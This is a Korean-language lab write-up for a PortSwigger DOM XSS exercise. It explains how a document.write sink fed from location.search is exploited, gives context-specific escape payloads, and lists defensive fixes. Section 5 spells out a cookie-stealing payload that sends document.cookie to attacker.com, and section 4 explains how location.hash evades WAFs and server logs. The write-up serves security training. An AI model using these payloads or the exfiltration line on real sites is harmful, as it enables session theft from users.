# Lab: DOM XSS in document.write sink using source location.search

## 개요

- **난이도**: Apprentice
- **주제**: Cross-Site Scripting (XSS) — DOM-based
- **링크**: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink

## 목표

검색 기능의 `document.write` sink에 DOM XSS를 삽입하여 `alert()` 함수를 실행시킨다.

## 취약점 분석

페이지 소스를 보면 검색어를 처리하는 JavaScript가 있다.

```javascript
// 페이지 내 JS 코드
var query = (new URLSearchParams(location.search)).get('search');
document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
```

`location.search`(URL의 `?search=...` 부분)를 읽어 `document.write`로 HTML에 직접 삽입한다. 서버를 거치지 않고 **브라우저 내 JS가 DOM을 직접 조작**하기 때문에 DOM-based XSS다.

## 공격 구조 분석

정상 검색 시 생성되는 HTML:

```html
<img src="/resources/images/tracker.gif?searchTerms=hello">
```

`">`로 `img` 태그를 닫고 새 태그를 삽입하면:

```
검색어: "><svg onload="alert(1)">
```

생성되는 HTML:

```html
<img src="/resources/images/tracker.gif?searchTerms="><svg onload="alert(1)">">
```

- `">` — `img` 태그의 `src` 속성과 태그 자체를 닫음
- `<svg onload="alert(1)">` — SVG 태그가 로드되자마자 `alert(1)` 실행

## SQL Injection과의 유사점

사용자가 느낀 직관이 정확하다.

| SQL Injection | DOM XSS |
|--------------|---------|
| `'`로 SQL 문자열 닫기 | `">`로 HTML 속성/태그 닫기 |
| `--`로 이후 쿼리 무력화 | `">` 뒤에 새 태그 삽입 |
| SQL 문법 탈출 후 공격자 코드 삽입 | HTML 문법 탈출 후 공격자 스크립트 삽입 |
| DB 서버에서 실행 | 브라우저에서 실행 |

**핵심 패턴은 동일하다 — 기존 문법 구조를 닫고, 공격자가 원하는 코드를 삽입한다.**

## SVG 이벤트 핸들러

[SVG 인터랙션 스펙](https://svgwg.org/svg2-draft/interact.html)에 따르면 SVG 요소는 HTML과 동일한 이벤트 핸들러를 지원한다.

주요 SVG 이벤트:

| 이벤트 | 발생 시점 | 예시 |
|--------|-----------|------|
| `onload` | SVG 요소 로드 완료 시 | `<svg onload="alert(1)">` |
| `onmouseover` | 마우스 올릴 때 | `<svg onmouseover="alert(1)">` |
| `onclick` | 클릭 시 | `<svg onclick="alert(1)">` |
| `onerror` | 로드 실패 시 | `<img src=x onerror="alert(1)">` |
| `onfocus` | 포커스 받을 때 | `<svg onfocus="alert(1)" tabindex=1>` |

`<svg onload="...">` 는 페이지 로드 즉시 사용자 상호작용 없이 실행되기 때문에 가장 많이 쓰이는 페이로드다.

## Reflected / Stored XSS와의 차이

| 항목 | Reflected (001) | Stored (002) | DOM-based (003) |
|------|-----------------|--------------|-----------------|
| 페이로드 처리 위치 | **서버** (응답 HTML에 포함) | **서버** (DB 저장 후 출력) | **브라우저** (JS가 DOM 조작) |
| 서버 응답에 페이로드 포함 | O | O | X (URL에만 존재) |
| 서버 로그에 탐지 가능 | O | O | 어려움 |
| 취약점 위치 | 서버 출력 코드 | 서버 저장/출력 코드 | 클라이언트 JS 코드 |

DOM-based XSS는 서버가 정상적인 HTML을 응답하기 때문에 서버 측 WAF나 로그 분석으로는 탐지가 어렵다.

## 핵심 정리

- `document.write`, `innerHTML`, `location.href` 등 사용자 입력을 DOM에 직접 삽입하는 sink가 DOM XSS의 근원이다.
- `location.search`, `location.hash`, `document.referrer` 등 URL에서 값을 읽는 source와 결합될 때 취약점이 성립한다.
- 속성값 내에 삽입된 경우 `">` 로 속성과 태그를 동시에 닫고 새 태그를 삽입하는 것이 SQL의 `'` 탈출과 동일한 원리다.
- **방어**: `document.write` 대신 `textContent` / `createElement` 사용, 입력값을 DOM에 삽입 전 인코딩.

## 배운 점 및 추가 학습

### 1. Source와 Sink 개념

DOM XSS를 분석할 때는 **source**(입력 진입점)와 **sink**(위험한 출력 함수) 두 가지를 추적한다.

| 분류 | 예시 |
|------|------|
| **Source** (입력) | `location.search`, `location.hash`, `document.referrer`, `window.name`, `postMessage` |
| **Sink** (위험 함수) | `document.write()`, `innerHTML`, `eval()`, `setTimeout(string)`, `location.href` |

source에서 읽은 값이 인코딩 없이 sink로 전달되면 DOM XSS가 성립한다.

### 2. 컨텍스트별 탈출 패턴

삽입 위치에 따라 닫아야 하는 문법이 다르다 — SQL의 컨텍스트별 탈출과 동일한 원리.

```html
<!-- 태그 속성 내부 (이번 랩) -->
<img src="[입력값]">
탈출: "><svg onload="alert(1)">

<!-- 단일 인용부호 속성 -->
<img src='[입력값]'>
탈출: '><svg onload='alert(1)'>

<!-- 태그 사이 (001, 002 랩) -->
<p>[입력값]</p>
탈출: <script>alert(1)</script>

<!-- JS 문자열 내부 -->
<script>var x = '[입력값]';</script>
탈출: '; alert(1);//
```

### 3. `document.write` 대신 안전한 DOM 조작

```javascript
// 위험 — 사용자 입력을 HTML로 직접 삽입
document.write('<img src="' + userInput + '">');
element.innerHTML = userInput;

// 안전 — 텍스트로만 삽입 (HTML 태그로 해석 안 됨)
element.textContent = userInput;

// 안전 — 요소를 직접 생성하고 속성을 별도로 설정
const img = document.createElement('img');
img.src = '/resources/tracker.gif?q=' + encodeURIComponent(userInput);
document.body.appendChild(img);
```

### 4. 탐지 우회 측면

DOM XSS는 페이로드가 서버로 전송되지 않기 때문에:
- 서버 측 WAF가 URL 파라미터를 검사해도 탐지 가능하지만, `location.hash`(`#` 이후)는 브라우저가 서버에 전송하지 않아 WAF 완전 우회 가능
- 서버 로그에 공격 흔적이 남지 않아 사후 분석이 어려움

```
https://example.com/search#"><svg onload="alert(1)">
                            ↑
                      # 이후는 서버에 전송되지 않음
```

### 5. `location.hash` DOM XSS — 서버 전송 없이 어떻게 공격이 성립하는가

서버에 페이로드가 전송되지 않는다는 것이 "공격이 안 된다"는 의미가 아니다. 공격 흐름은 Reflected XSS와 동일하게 **피해자가 공격자가 만든 URL을 클릭**하는 방식이다.

```
1. 공격자: 악성 URL 생성
   https://victim.com/search#"><svg onload="fetch('https://attacker.com/?c='+document.cookie)">

2. 피해자: 링크 클릭
   브라우저 → 서버로 전송: GET /search  (# 이후는 서버에 안 감)
   서버 → 정상 HTML 응답 (취약한 JS 코드 포함)

3. 브라우저: JS 실행
   const query = location.hash.slice(1);   // # 이후를 직접 읽음
   document.write('<img src="...?q=' + query + '">');
   → <img src="...?q="><svg onload="fetch(...)"> 생성
   → SVG 로드 즉시 fetch() 실행

4. 공격 결과:
   피해자의 쿠키가 attacker.com 서버로 전송됨
```

서버는 처음부터 끝까지 정상적인 요청/응답만 처리했지만, 피해자 브라우저 안에서 공격이 완결된다.

**정리**: 공격 방식(피해자에게 URL 전달)과 결과(브라우저에서 스크립트 실행)는 Reflected XSS와 동일하다. 서버를 거치지 않는다는 특성은 탐지/차단 회피 수단으로 활용된다.
